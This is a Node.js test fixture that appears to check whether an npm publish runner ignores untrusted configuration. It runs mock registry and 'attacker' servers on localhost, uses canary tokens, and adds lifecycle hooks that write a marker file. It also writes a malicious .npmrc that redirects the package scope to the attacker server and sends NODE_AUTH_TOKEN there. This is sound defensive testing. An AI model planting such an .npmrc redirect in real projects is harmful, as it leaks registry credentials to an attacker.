import { spawn } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

export const pkgName = "@opensesame-labs/cli";
export const version = "0.0.0-alpha.23";
export const staticToken = "static-token-canary";
export const oidcToken = "oidc-request-canary";
export const oidcJwt = "header.payload.signature";
export const issuedToken = "temporary-registry-token-canary";
const runner = fileURLToPath(
  new URL("./npm-publish-isolation-runner.mjs", import.meta.url),
);

function listen(server) {
  return new Promise((done, fail) => {
    server.once("error", fail);
    server.listen(0, "127.0.0.1", () => done(server.address().port));
  });
}
function close(server) {
  return new Promise((done, fail) =>
    server.close((error) => (error ? fail(error) : done())),
  );
}
export function runFixture(args, env) {
  return new Promise((done, fail) => {
    const child = spawn(process.execPath, [runner, ...args], {
      env,
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.setEncoding("utf8").on("data", (chunk) => {
      stdout += chunk;
    });
    child.stderr.setEncoding("utf8").on("data", (chunk) => {
      stderr += chunk;
    });
    child.once("error", fail);
    child.once("close", (code) => done({ code, stdout, stderr }));
  });
}
export function manifest(overrides = {}) {
  return {
    name: pkgName,
    version,
    files: ["payload.txt"],
    publishConfig: { access: "public", provenance: true },
    ...overrides,
  };
}
function json(res, status, value) {
  res
    .writeHead(status, { "content-type": "application/json" })
    .end(JSON.stringify(value));
}
function registryServer(state) {
  return createServer((req, res) => {
    state.requests.push({
      url: req.url,
      method: req.method,
      auth: req.headers.authorization,
      mode: state.mode,
    });
    if (req.url?.startsWith("/oidc")) return json(res, 200, { value: oidcJwt });
    if (req.url?.startsWith("/-/npm/v1/oidc/token/exchange/")) {
      return json(
        res,
        state.mode === "oidc" ? 200 : 403,
        state.mode === "oidc" ? { token: issuedToken } : { error: "disabled" },
      );
    }
    if (state.mode === "missing") return json(res, 404, { error: "Not found" });
    const prepared = readdirSync(state.temp).find((name) =>
      name.startsWith("opensesame-publish-"),
    );
    const saved = JSON.parse(
      readFileSync(join(state.temp, prepared, "state.json"), "utf8"),
    );
    const versions = { "1.0.0": { name: pkgName, version: "1.0.0" } };
    if (state.mode !== "version-missing") {
      versions[version] = {
        name: pkgName,
        version,
        dist:
          state.mode === "no-integrity" ? {} : { integrity: saved.integrity },
      };
    }
    return json(res, 200, {
      name: pkgName,
      "dist-tags": { alpha: version },
      versions,
    });
  });
}
function environment(state, cli, home) {
  return {
    ...process.env,
    RUNNER_TEMP: state.temp,
    OPENSESAME_NPM_CLI: cli,
    HOME: home,
    NODE_AUTH_TOKEN: staticToken,
    NPM_TOKEN_INPUT: "duplicate-canary",
    ACTIONS_ID_TOKEN_REQUEST_URL: `${state.goodRegistry}oidc`,
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: oidcToken,
    GITHUB_ACTIONS: "true",
    CI: "true",
    NPM_CONFIG_USERCONFIG: join(home, ".npmrc"),
    npm_config_registry: state.badRegistry,
    "npm_config_@opensesame-labs:registry": state.badRegistry,
    NO_PROXY: "127.0.0.1,localhost",
    no_proxy: "127.0.0.1,localhost",
  };
}
export async function setupFixture(t, pinnedCli) {
  const temp = mkdtempSync(join(tmpdir(), "opensesame-npm-isolation-"));
  const state = { temp, mode: "token", requests: [], attackRequests: [] };
  const realNpmRoot = dirname(dirname(dirname(dirname(pinnedCli))));
  symlinkSync(realNpmRoot, join(temp, "opensesame-npm-AB12cd34"), "dir");
  const cli = join(
    temp,
    "opensesame-npm-AB12cd34/extracted/package/bin/npm-cli.js",
  );
  state.packageDirectory = join(temp, "artifact");
  const home = join(temp, "untrusted-home");
  mkdirSync(state.packageDirectory);
  mkdirSync(home);
  state.hook = join(temp, "hook-ran");
  const script = `node -e ${JSON.stringify(`require('node:fs').writeFileSync(${JSON.stringify(state.hook)}, 'bad')`)}`;
  writeFileSync(join(state.packageDirectory, "payload.txt"), "payload\n");
  writeFileSync(
    join(state.packageDirectory, "package.json"),
    JSON.stringify(
      manifest({ scripts: { prepack: script, prepublishOnly: script } }),
    ),
  );
  const attacker = createServer((req, res) => {
    state.attackRequests.push({
      url: req.url,
      auth: req.headers.authorization,
    });
    res.writeHead(500).end();
  });
  const attackerPort = await listen(attacker);
  state.badRegistry = `http://127.0.0.1:${attackerPort}/`;
  const malicious = `@opensesame-labs:registry=${state.badRegistry}\n//127.0.0.1:${attackerPort}/:_authToken=\${NODE_AUTH_TOKEN}\n`;
  writeFileSync(join(state.packageDirectory, ".npmrc"), malicious);
  writeFileSync(join(home, ".npmrc"), malicious);
  const registry = registryServer(state);
  state.goodRegistry = `http://127.0.0.1:${await listen(registry)}/`;
  state.env = environment(state, cli, home);
  t.after(async () => {
    await close(attacker);
    await close(registry);
    rmSync(temp, { recursive: true, force: true });
  });
  return state;
}
